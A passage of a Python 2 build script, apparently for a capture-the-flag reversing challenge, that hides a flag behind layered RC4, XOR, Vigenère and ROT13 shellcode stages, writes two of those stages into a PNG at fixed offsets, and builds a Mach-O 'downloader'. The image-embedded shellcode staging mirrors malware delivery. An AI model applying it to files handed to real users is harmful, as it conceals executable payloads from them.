        VERIFYB = B[0] ^ C[0]
        VERIFYA = A[0] ^ B[0]
        print hex(FLAG_INTEGER)

        # ----------------------------------
        # RC4 ENCRYPTION
        # ----------------------------------
        # Combine FLAG_INTEGER with RC4_PRINT
        size_of_buffer = len(RC4_PRINT) + 8
        rc4_plaintext = ctypes.create_string_buffer(size_of_buffer)
        ctypes.memmove(rc4_plaintext, byref(c_ulong(swap64(FLAG_INTEGER))), 8)
        ctypes.memmove(byref(rc4_plaintext, 8), RC4_PRINT, len(RC4_PRINT))
        rc4_encrypt(rc4_plaintext, rc4_plaintext, RC4_KEY)
        #print(ctypes.sizeof(rc4_plaintext), repr(rc4_plaintext.raw))
        rc4_encrypted = [ord(num[0]) for num in rc4_plaintext.raw]
        generate_rc4_assembly(rc4_encrypted, RC4_ASSEMBLY_FILE)
        generate_macho(RC4_ASSEMBLY_FILE)
        rc4_shellcode = extract_shellcode(RC4_ASSEMBLY_FILE)

        # ----------------------------------
        # STREAM XOR ENCRYPTION
        # ----------------------------------
        xor_encrypted = list(rc4_shellcode)
        xor_encrypt(xor_encrypted, XOR_KEY)
        generate_xor_assembly(xor_encrypted, XOR_ASSEMBLY_FILE)
        generate_macho(XOR_ASSEMBLY_FILE)
        xor_shellcode = extract_shellcode(XOR_ASSEMBLY_FILE)

        # ----------------------------------
        # VIGENERE CIPHER ENCRYPTION
        # ----------------------------------
        cipher_encrypted = list(xor_shellcode)
        cipher_encrypt(cipher_encrypted, CIPHER_KEY)
        generate_cipher_assembly(cipher_encrypted, CIPHER_ASSEMBLY_FILE)
        generate_macho(CIPHER_ASSEMBLY_FILE)
        extract_shellcode(CIPHER_ASSEMBLY_FILE)

        # ----------------------------------
        # ROT13 ENCRYPTION
        # ----------------------------------
        rot13_encrypted = ro13_encrypt(ROT13_KEY)
        generate_rot13_assembly(rot13_encrypted, ROT13_ASSEMBLY_FILE)
        generate_macho(ROT13_ASSEMBLY_FILE)
        extract_shellcode(ROT13_ASSEMBLY_FILE)
        # ----------------------------------
        # BUILD IMAGE
        # ----------------------------------
        copyfile(os.path.join(SRC_DIR,PNG_FILE), os.path.join(DIST_DIR,PNG_NAME))
        b = os.path.splitext(ROT13_ASSEMBLY_FILE)[0]
        rot13_shellcode_filename = os.path.join(SRC_DIR,"%s_shellcode.bin" % (b))
        with open(rot13_shellcode_filename, 'rb') as sc:
            shellcode_bytes = sc.read()
            with open(os.path.join(DIST_DIR,PNG_NAME), 'r+b') as png:
                s=png.read()
                png.seek(0)
                png.write(s[:CODE_PNG_OFFSET]
                    +shellcode_bytes
                    +s[CODE_PNG_OFFSET+len(shellcode_bytes):])
                png.close()
            sc.close()

        b = os.path.splitext(CIPHER_ASSEMBLY_FILE)[0]
        cipher_shellcode_filename = os.path.join(SRC_DIR,"%s_shellcode.bin" % (b))
        with open(cipher_shellcode_filename, 'rb') as sc:
            shellcode_bytes2 = sc.read()
            with open(os.path.join(DIST_DIR,PNG_NAME), 'r+b') as png:
                s=png.read()
                png.seek(0)
                png.write(s[:CODE_PNG_OFFSET+CODE_PNG_OFFSET_2]
                    +shellcode_bytes2
                    +s[CODE_PNG_OFFSET+CODE_PNG_OFFSET_2+len(shellcode_bytes2):])
                png.close()
            sc.close()
        # ----------------------------------
        # GENERATE DOWNLOADER
        # ----------------------------------
        generate_downloader(DOWNLOADER_FILE)
        generate_downloader_macho(DOWNLOADER_FILE)
    elif args.clean and not args.build:
        rmfile(RC4_ASSEMBLY_FILE)
        rmfile(XOR_ASSEMBLY_FILE)
        rmfile(CIPHER_ASSEMBLY_FILE)
        rmfile(ROT13_ASSEMBLY_FILE)
        if os.path.exists(os.path.join(DIST_DIR,PNG_NAME)):
            os.remove(os.path.join(DIST_DIR,PNG_NAME))
        if os.path.exists(os.path.join(DIST_DIR,"%s.macho" % DOWNLOADER_FILE)):
            os.remove(os.path.join(DIST_DIR,"%s.macho" % DOWNLOADER_FILE))
        if os.path.exists(os.path.join(SRC_DIR,"gen_%s.c" % DOWNLOADER_FILE)):
            os.remove(os.path.join(SRC_DIR,"gen_%s.c" % DOWNLOADER_FILE))

if __name__ == '__main__':
    main()
